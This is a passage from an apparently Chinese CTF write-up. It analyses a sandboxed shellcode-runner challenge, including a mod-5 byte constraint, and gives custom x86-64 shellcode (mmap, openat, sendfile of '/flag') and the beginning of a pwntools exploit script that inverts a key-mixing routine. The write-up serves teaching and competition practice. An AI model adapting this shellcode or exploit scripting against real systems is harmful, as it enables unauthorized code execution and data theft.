)</span><br><span class="line">            <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">        LABEL_21:</span><br><span class="line">        <span class="keyword">if</span> ( (v11 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">        <span class="keyword">if</span> ( v31 != <span class="number">1</span> || v14 &lt;= <span class="number">4</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        v11 = <span class="number">0</span>;</span><br><span class="line">        v10 = v14;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v31 || v14 &lt;= <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">    <span class="built_in">LOWORD</span>(v24[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">    v18 = <span class="number">0</span>;</span><br><span class="line">    v4 = v33;</span><br><span class="line">    v19 = v32;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">getrandom</span>(v24, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">        v4[v18++] ^= <span class="built_in">LOBYTE</span>(v24[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v19 != v18 );</span><br><span class="line">    LABEL_29:</span><br><span class="line">    <span class="keyword">if</span> ( !fork() )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">mprotect</span>(v4, <span class="number">0x1000u</span>, <span class="number">5</span>);</span><br><span class="line">        <span class="built_in">sandbox</span>();</span><br><span class="line">        __asm &#123; jmp     rax &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">LODWORD</span>(v2) = <span class="built_in">wait</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">int</span>)v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>shellcode每连续的三个字节为一组进行如下游戏校验：</p>
<p>游戏背景：</p>
<ul>
<li>游戏有 3 个玩家和一个 boss，三个玩家的血量分别为 shellcode 字节值 + 255。</li>
<li>boss 的血量为三个玩家血量之和。</li>
<li>所有人的攻击力为 5，没有防御属性，即一次攻击会令对手损失 5 点生命值。</li>
<li>血量 &lt; 5 视为死亡状态。</li>
</ul>
<p>每个回合中执行如下操作：</p>
<ul>
<li>随机选择一个<strong>存活</strong>状态的玩家与 boss 进行战斗。</li>
<li>玩家先攻击，令 Boss 损失 5 点生命值。</li>
<li>Boss 攻击选定玩家，损失 5 点生命值。</li>
<li>任意时间内，有一方完全死亡时游戏结束，完全死亡的一方游戏失败。</li>
</ul>
<p>把游戏抽象为数学模型，不妨设三个玩家的生命值为 <code>5x + a , 5y + b , 5z + c</code>，Boss 血量根据要求为 <code>5(x + y + z) +  (a + b + c) | (a,b,c &lt; 5)</code>。</p>
<p>说白了，这游戏就不太可能可以赢，因为一个 <code>5x + a</code> 血量的人物只能给 Boss 造成 <code>5x</code> 的伤害，但是好在玩家先手，如果前面两个人（可以证明，游戏输赢和攻击顺序无关）死亡的情况下，剩下最后一个人，双方血量分别为 <code>5z + c</code> 和 <code>5z + a + b + c</code>，经过 <code>z - 1</code> 个回合之后，血量变成 <code>5 + z</code> 和 <code>5 + a + b + c</code>，最后一刻，必须给 Boss 致命一击，即攻击过后 <code>a + b + c &lt; 5</code>，不然它再打过来玩家必输。</p>
<p>这里的 a，b，c 自然就是 <code>byte % 5</code> 的值，所以 shellcode 必须满足下面的要求。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(shellcode)-<span class="number">2</span>):</span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        s += shellcode[i+j] % <span class="number">5</span></span><br><span class="line">    <span class="keyword">if</span> s &gt;= <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;error&quot;</span>)</span><br><span class="line">        quit()</span><br></pre></td></tr></table></figure>

<p>只要任意三个连续的字节 <code>%5</code> 相加的值大于等于 5，这个 shellcode 就是不合法的。</p>
<p>所以尽量要选择权值（%5得到的值）尽可能低的指令去输入，一些比较好用的指令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">jmp $+2</span><br><span class="line">; EB 00</span><br><span class="line">; 0  0</span><br><span class="line">mov ecx, $imm</span><br><span class="line">; B9 ?? ?? ?? ??</span><br><span class="line">; 0  ?? ?? ?? ??</span><br></pre></td></tr></table></figure>

<p>其余一些 mov 指令巨难用，一不小心就会超过，所以推荐用 <code>xchg r1,r2</code>，它的优点就是，如果正着来权值过大可以反过来，即写 <code>xchg r2,r1</code>，指令效果完全等价。</p>
<img src="/2025/11/26/qwb2025_final/17.png" class="">

<p>执行 shellcode 之前，它把几乎所有寄存器都清零了，也就是找不到一个可写的地址。</p>
<p>在此之前，也先看看沙箱</p>
<img src="/2025/11/26/qwb2025_final/18.png" class="">

<p>这里我选择是直接 patch main 函数，直接执行 sandbox 函数，得到的沙箱结果。</p>
<p>这个沙箱很简单，直接 <code>openat + sendfile</code> 即可，但是可写内存没有，因此我选择了 <code>mmap</code> 去分配内存，然后将栈定向到这块内存中去（虽然没用到），这块内存可以用于去写 <code>/flag</code> 字符串。</p>
<p>这个题目在执行 shellcode 之后还关闭了标准输入，导致我们没有办法重写 shellcode，只能按照它的要求和规则去书写。</p>
<p>下面是我写的 shellcode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">mov ecx,9</span><br><span class="line">mov eax,ecx</span><br><span class="line">mov edi,0</span><br><span class="line">mov esi,0xa000</span><br><span class="line">mov edx,7</span><br><span class="line">mov ecx,0x22</span><br><span class="line">mov r10d,ecx</span><br><span class="line">syscall</span><br><span class="line">; openat</span><br><span class="line"></span><br><span class="line">add rax, 0x5000</span><br><span class="line"></span><br><span class="line">mov rbx,rax</span><br><span class="line">jmp $+2</span><br><span class="line">xchg rbx,rbp</span><br><span class="line">mov rbx,rax</span><br><span class="line">xchg rbx,rsp</span><br><span class="line">sub rax,0x5000</span><br><span class="line"></span><br><span class="line">mov rbx,rax</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">; write /flag</span><br><span class="line">mov ecx,&#x27;/&#x27;</span><br><span class="line">mov [rbx],cl</span><br><span class="line">jmp $+2</span><br><span class="line">inc rbx</span><br><span class="line"></span><br><span class="line">mov ecx,&#x27;f&#x27;</span><br><span class="line">mov [rbx],cl</span><br><span class="line">jmp $+2</span><br><span class="line">inc rbx</span><br><span class="line"></span><br><span class="line">mov ecx,&#x27;l&#x27;</span><br><span class="line">mov [rbx],cl</span><br><span class="line">jmp $+2</span><br><span class="line">inc rbx</span><br><span class="line"></span><br><span class="line">mov ecx,&#x27;a&#x27;</span><br><span class="line">mov [rbx],cl</span><br><span class="line">jmp $+2</span><br><span class="line">inc rbx</span><br><span class="line"></span><br><span class="line">mov ecx,&#x27;g&#x27;</span><br><span class="line">mov [rbx],cl</span><br><span class="line">jmp $+2</span><br><span class="line">inc rbx</span><br><span class="line"></span><br><span class="line">mov ecx, 0</span><br><span class="line">mov [rbx],cl</span><br><span class="line">jmp $+2</span><br><span class="line">inc rbx</span><br><span class="line">jmp $+2</span><br><span class="line"></span><br><span class="line">mov rbx,rax</span><br><span class="line">jmp $+2</span><br><span class="line">xchg rsi,rbx</span><br><span class="line">jmp $+2</span><br><span class="line">mov ecx,0</span><br><span class="line">jmp $+2</span><br><span class="line">mov edi,ecx</span><br><span class="line">jmp $+2</span><br><span class="line">mov ecx,0</span><br><span class="line">jmp $+2</span><br><span class="line">mov edx,ecx</span><br><span class="line">jmp $+2</span><br><span class="line">mov ecx,1</span><br><span class="line">jmp $+2</span><br><span class="line">mov edi,ecx</span><br><span class="line">jmp $+2</span><br><span class="line">mov ecx,257</span><br><span class="line">jmp $+2</span><br><span class="line">mov eax,ecx</span><br><span class="line">jmp $+2</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov ecx,0</span><br><span class="line"></span><br><span class="line">jmp $+2</span><br><span class="line">mov esi,ecx</span><br><span class="line">jmp $+2</span><br><span class="line">mov ecx,1</span><br><span class="line">jmp $+2</span><br><span class="line">mov edi,ecx</span><br><span class="line">jmp $+2</span><br><span class="line">mov ecx,0x30</span><br><span class="line">mov r10d,ecx</span><br><span class="line"></span><br><span class="line">mov ecx,40</span><br><span class="line">mov eax,ecx</span><br><span class="line">mov ecx,0</span><br><span class="line">mov edx,ecx</span><br><span class="line">syscall</span><br><span class="line">;sendfile</span><br></pre></td></tr></table></figure>

<p>shellcode满足要求之后直接写 exp 脚本，这里省略了爆破密码的步骤。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> m <span class="keyword">import</span> find_k_b_from_sequence</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ror64</span>(<span class="params">value, shift, bits=<span class="number">64</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;64位循环右移 - rol64的逆操作&quot;&quot;&quot;</span></span><br><span class="line">    shift %= bits</span><br><span class="line">    <span class="keyword">return</span> ((value &gt;&gt; shift) | (value &lt;&lt; (bits - shift))) &amp; ((<span class="number">1</span> &lt;&lt; bits) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rol64</span>(<span class="params">value, shift, bits=<span class="number">64</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;64位循环左移&quot;&quot;&quot;</span></span><br><span class="line">    shift %= bits</span><br><span class="line">    <span class="keyword">return</span> ((value &lt;&lt; shift) | (value &gt;&gt; (bits - shift))) &amp; ((<span class="number">1</span> &lt;&lt; bits) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mix</span>(<span class="params">v6</span>):</span><br><span class="line">    v7 = v6 ^ (v6 &gt;&gt; <span class="number">1</span>) ^ ((v6 ^ (v6 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) ^ ((v6 ^ (v6 &gt;&gt; <span class="number">1</span>) ^ ((v6 ^ (v6 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>)) &gt;&gt; <span class="number">4</span>) ^ (</span><br><span class="line">                (v6 ^ (v6 &gt;&gt; <span class="number">1</span>) ^ ((v6 ^ (v6 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) ^ ((v6 ^ (v6 &gt;&gt; <span class="number">1</span>) ^ ((v6 ^ (v6 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>)) &gt;&gt; <span class="number">4</span>)) &gt;&gt; <span class="number">8</span>) ^ (</span><br><span class="line">                     (v6 ^ (v6 &gt;&gt; <span class="number">1</span>) ^ ((v6 ^ (v6 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) ^ ((v6 ^ (v6 &gt;&gt; <span class="number">1</span>) ^ ((v6 ^ (v6 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>)) &gt;&gt; <span class="number">4</span>) ^ ((</span><br><span class="line">                                                                                                                                  v6 ^ (</span><br><span class="line">                                                                                                                                      v6 &gt;&gt; <span class="number">1</span>) ^ (</span><br><span class="line">                                                                                                                                              (</span><br><span class="line">                                                                                                                                                          v6 ^ (</span><br><span class="line">                                                                                                                                                              v6 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) ^ (</span><br><span class="line">                                                                                                                                              (</span><br><span class="line">                                                                                                                                                          v6 ^ (</span><br><span class="line">                                                                                                                                                              v6 &gt;&gt; <span class="number">1</span>) ^ (</span><br><span class="line">                                                                                                                                                                      (</span><br><span class="line">                                                                                                                                                                                  v6 ^ (</span><br><span class="line">                                                                                                                                                                                      v6 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>)) &gt;&gt; <span class="number">4</span>)) &gt;&gt; <span class="number">8</span>)) &gt;&gt; <span class="number">16</span>)</span><br><span class="line">    v7 = v7 &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">    v7h = v7 &gt;&gt; <span class="number">32</span></span><br><span class="line">    v8 = rol64(v7 ^ v7h, <span class="number">7</span>)</span><br><span class="line">    <span class="keyword">return</span> v8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inverse_xor_shift</span>(<span class="params">y, k</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;逆异或变换：从 y 恢复 x，满足 y = x ^ (x &gt;&gt; k)&quot;&quot;&quot;</span></span><br><span class="line">    x = y</span><br><span class="line">    shift = k</span><br><span class="line">    <span class="keyword">while</span> shift &lt; <span class="number">64</span>:</span><br><span class="line">        x = x ^ (x &gt;&gt; shift)</span><br><span class="line">        shift *= <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> x &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inverse_mix</span>(<span class="params">v8</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;mix 函数的逆向算法&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 步骤1: 循环右移7位得到 u</span></span><br><span class="line">    u = ror64(v8, <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 步骤2: 从 u 恢复 v7</span></span><br><span class="line">    u_high = (u &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    u_low = u &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v7_high = u_high</span><br><span class="line">    v7_low = u_low ^ u_high</span><br><span class="line">    v7 = (v7_high &lt;&lt; <span class="number">32</span>) | v7_low</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 步骤3-7: 逐步逆异或变换恢复 v6</span></span><br><span class="line">    x4 = inverse_xor_shift(v7, <span class="number">16</span>)</span><br><span class="line">    x3 = inverse_xor_shift(x4, <span class="number">8</span>)</span><br><span class="line">    x2 = inverse_xor_shift(x3, <span class="number">4</span>)</span><br><span class="line">    x1 = inverse_xor_shift(x2, <span class="number">2</span>)</span><br><span class="line">    x0 = inverse_xor_shift(x1, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> x0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">OOO = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D</span></span><br><span class="line"><span class="string">3D 20 54 4F 59 20 45 4E 43 52 59 50 54 45 44 20</span></span><br><span class="line"><span class="string">53 45 52 56 49 43 45 20 3D 3D 3D 3D 3D 3D 3D 3D</span></span><br><span class="line"><span class="string">3D 3D 3D 3D 3D 3D 3D 3D 3D 0A 31 29 20 45 63 68</span></span><br><span class="line"><span class="string">6F 20 62 61 63 6B 20 77 68 61 74 20 79 6F 75 20</span></span><br><span class="line"><span class="string">73 65 6E 64 0A 32 29 20 41 64 6D 69 6E 20 6C 6F</span></span><br><span class="line"><span class="string">67 69 6E 0A 33 29 20 4D 61 67 69 63 43 6F 64 65</span></span><br><span class="line"><span class="string">20 72 75 6E 6E 65 72 0A 34 29 20 53 68 6F 77 20</span></span><br><span class="line"><span class="string">63 6F 6E 66 69 67 0A 35 29 20 51 75 69 74 0A 0A</span></span><br><span class="line"><span class="string">2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D</span></span><br><span class="line"><span class="string">2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D</span></span><br><span class="line"><span class="string">2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D</span></span><br><span class="line"><span class="string">2D 2D 2D 2D 2D 2D 2D 2D 2D 0A 59 6F 75 72 20 63</span></span><br><span class="line"><span class="string">68 6F 69 63 65 3A 20</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setKey</span>(<span class="params">hexdata</span>):</span><br><span class="line">    data = <span class="built_in">bytes</span>.fromhex(hexdata.decode())</span><br><span class="line">    <span class="keyword">global</span> KEYA, KEYB, KEYC, KEYX</span><br><span class="line">    kc = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">    kb = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">    ka = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xC0</span> // <span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">4</span> == <span class="number">0</span>):</span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line">        num1 = u64(data[i * <span class="number">8</span>:i * <span class="number">8</span> + <span class="number">8</span>])</span><br><span class="line">        num2 = u64(OOO[i * <span class="number">8</span>:i * <span class="number">8</span> + <span class="number">8</span>])</span><br><span class="line">        KEYX.append(num1 ^ num2)</span><br><span class="line">        KEYC_TMP.append(inverse_mix(num1 ^ num2))</span><br><span class="line">        <span class="comment"># print(hex(KEYX[i]),hex(KEYC[i]))</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;----------&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>, <span class="number">8</span>):</span><br><span class="line">        num1 = u64(data[i * <span class="number">8</span>:i * <span class="number">8</span> + <span class="number">8</span>])</span><br><span class="line">        num2 = u64(OOO[i * <span class="number">8</span>:i * <span class="number">8</span> + <span class="number">8</span>])</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">5</span> <span class="keyword">or</span> i == <span class="number">7</span>:</span><br><span class="line">            KEYB[i &amp; <span class="number">3</span>] = KEYC_TMP[i]</span><br><span class="line">            <span class="comment"># print(hex(KEYB[i &amp; 3]))</span></span><br><span class="line">    k1 = [KEYC_TMP[<span class="number">0</span>], KEYC_TMP[<span class="number">4</span>], KEYC_TMP[<span class="number">8</span>], KEYC_TMP[<span class="number">12</span>]]</span><br><span class="line">    k2 = [KEYC_TMP[<span class="number">1</span>], KEYC_TMP[<span class="number">5</span>], KEYC_TMP[<span class="number">9</span>], KEYC_TMP[<span class="number">13</span>]]</span><br><span class="line">    k3 = [KEYC_TMP[<span class="number">2</span>], KEYC_TMP[<span class="number">6</span>], KEYC_TMP[<span class="number">10</span>], KEYC_TMP[<span class="number">14</span>]]</span><br><span class="line">    k4 = [KEYC_TMP[<span class="number">3</span>], KEYC_TMP[<span class="number">7</span>], KEYC_TMP[<span class="number">11</span>], KEYC_TMP[<span class="number">15</span>]]</span><br><span class="line">    res1 = find_k_b_from_sequence(k1)</span><br><span class="line">    res2 = find_k_b_from_sequence(k2)</span><br><span class="line">    res3 = find_k_b_from_sequence(k3)</span><br><span class="line">    res4 = find_k_b_from_sequence(k4)</span><br><span class="line">    <span class="built_in">print</span>(res1)</span><br><span class="line">    <span class="built_in">print</span>(res2)</span><br><span class="line">    <span class="built_in">print</span>(res3)</span><br><span class="line">    <span class="built_in">print</span>(res4)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(res1) 